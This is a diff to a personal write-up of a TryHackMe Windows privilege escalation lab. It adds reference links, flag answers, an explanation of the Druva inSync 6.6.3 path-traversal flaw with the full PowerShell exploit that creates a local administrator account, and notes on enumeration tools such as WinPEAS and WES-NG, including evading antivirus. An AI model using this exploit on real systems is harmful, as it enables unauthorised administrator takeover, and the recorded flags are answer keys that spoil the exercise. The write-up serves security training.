@@ -13,9 +13,17 @@ Ref:
 
 - [THM: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)
 
-- [Windows Fundamentals Module](https://tryhackme.com/module/windows-fundamentals)
+- [THM: Windows Fundamentals Module](https://tryhackme.com/module/windows-fundamentals)
 
-- [Hacking Windows Module](https://tryhackme.com/module/hacking-windows-1)
+- [THM: Hacking Windows Module](https://tryhackme.com/module/hacking-windows-1)
+
+- [THM: Core Windows Processes](http://tryhackme.com/jr/btwindowsinternals)
+
+
+- [THM: Sysinternals](http://tryhackme.com/jr/btsysinternalssg)
+
+- [THM: Yara](https://tryhackme.com/room/yara)
+
 
 - [Priv2Admin Github project](https://github.com/gtworek/Priv2Admin)
 
@@ -23,7 +31,29 @@ Ref:
 
 - [A complete list of available privileges on Windows systems](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
 
+- [exploit-db](https://www.exploit-db.com/)
 
+- [packet storm](https://packetstormsecurity.com/)
+
+- [WinPEAS ](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) - target system to uncover privilege escalation paths
+
+- [PrivescCheck](https://github.com/itm4n/PrivescCheck) - searches common privilege escalation on the target system via PowerShell
+
+- [WES-NG: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
+
+- [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). 
+
+- [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12)
+
+- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
+- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
+- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+- [Decoder's Blog](https://decoder.cloud/)
+- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
+- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+
+- [Link](https://www.youtube.com/watch?v=k_99-dXtdpc&t=3647s)
 ---
 
 Task 1  Introduction
@@ -956,11 +986,197 @@ nt authority\system
 
 Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.
 
+1. Get the flag on the Administrator's desktop.(1:00)
+
+Answer :THM{SEFLAGPRIVILEGE}
+
+![img](/assets/img/wpe26.png)
+
+
+
+
+
+---
+
+Task 7 - Abusing vulnerable software
+---
+
+
+### Unpatched Software
+---
+
+Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):
+```
+wmic product get name,version,vendor
+
+```
+Remember that the ```wmic product``` command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
+
+Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or plain old [Google](https://www.google.com/), amongst many others.
+
+Using wmic and Google, can you find a known vulnerability on any installed product?
+
+
+### Case Study: Druva inSync 6.6.3
+---
+
+The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).
+
+The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.
+
+In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.
+
+The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.
+
+A patch was issued, where they decided to check that the executed command started with the string C:\ProgramData\Druva\inSync4\, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute 
+```
+C:\Windows\System32\cmd.exe
+``` 
+which is not in the allowed path; you could simply ask the server to run 
+```
+C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
+```
+and that would bypass the check successfully.
+
+To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:
+
+![img](/assets/img/wpe22.png)
+
+
+The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.
+
+Initially published by Matteo Malvica [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:
+```
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+You can pop a Powershell console and paste the exploit directly to execute it (The exploit is also available in the target machine at ```C:\tools\Druva_inSync_exploit.txt```). Note that the exploit's default payload, specified in the ```$cmd``` variable, will create a user named pwnd in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this room, we will change the payload to run the following command:
+```
+net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
+```
+This will create user ```pwnd``` with a password of ```SimplePass123``` and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user pwnd exists and is part of the administrators' group:
+
+Command Prompt
+```
+PS C:\> net user pwnd
+User name                    pwnd
+Full Name
+Account active               Yes
+[...]
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+```
+As a last step, you can run a command prompt as administrator:
+
+![img](/assets/img/wpe14.png)
+
+
+When prompted for credentials, use the ```pwnd``` account. From the new command prompt, you can retrieve your flag from the Administrator's desktop with the following command type 
+```
+C:\Users\Administrator\Desktop\flag.txt
+```
+
 1. Get the flag on the Administrator's desktop.
-Answer :
+Answer: 
+THM{EZ_DLL_PROXY_4ME}
 
+![img](/assets/img/wpe23.png)
+
+![img](/assets/img/wpe24.png)
+
+![img](/assets/img/wpe25.png)
 
 ---
 
+Task 8 - Tools of the Trade
 ---
 
+Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.
+
+Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.
+
+
+
+### WinPEAS
+---
+WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
+
+Command Prompt
+```
+C:\> winpeas.exe > outputfile.txt
+```
+WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).
+
+
+
+### PrivescCheck
+---
+PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.
+
+PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).
+
+Reminder: To run PrivescCheck on the target system, you may ```need to bypass the execution policy restrictions```. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
+
+Powershell
+```
+PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+PS C:\> . .\PrivescCheck.ps1
+PS C:\> Invoke-PrivescCheck
+```
+
+
+### WES-NG: Windows Exploit Suggester - Next Generation
+---
+Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).
+
+WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).
+
+Once installed, and before using it, type the ```wes.py --update``` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.
+
+To use the script, you will need to run the ```systeminfo``` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
+
+Once this is done, wes.py can be run as follows;
+
+Kali Linux
+```
+user@kali$ wes.py systeminfo.txt
+```
+
+
+### Metasploit
+---
+If you already have a Meterpreter shell on the target system, you can use the ```multi/recon/local_exploit_suggester``` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
+
+---
+
+Task 9 - Conclusion
+---
+
+In this room, we have introduced several privilege escalation techniques available in Windows systems. These techniques should provide you with a solid background on the most common paths attackers can take to elevate privileges on a system. Should you be interested in learning about additional techniques, the following resources are available:
+
+- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
+- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
+- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+- [Decoder's Blog](https://decoder.cloud/)
+- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
+- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
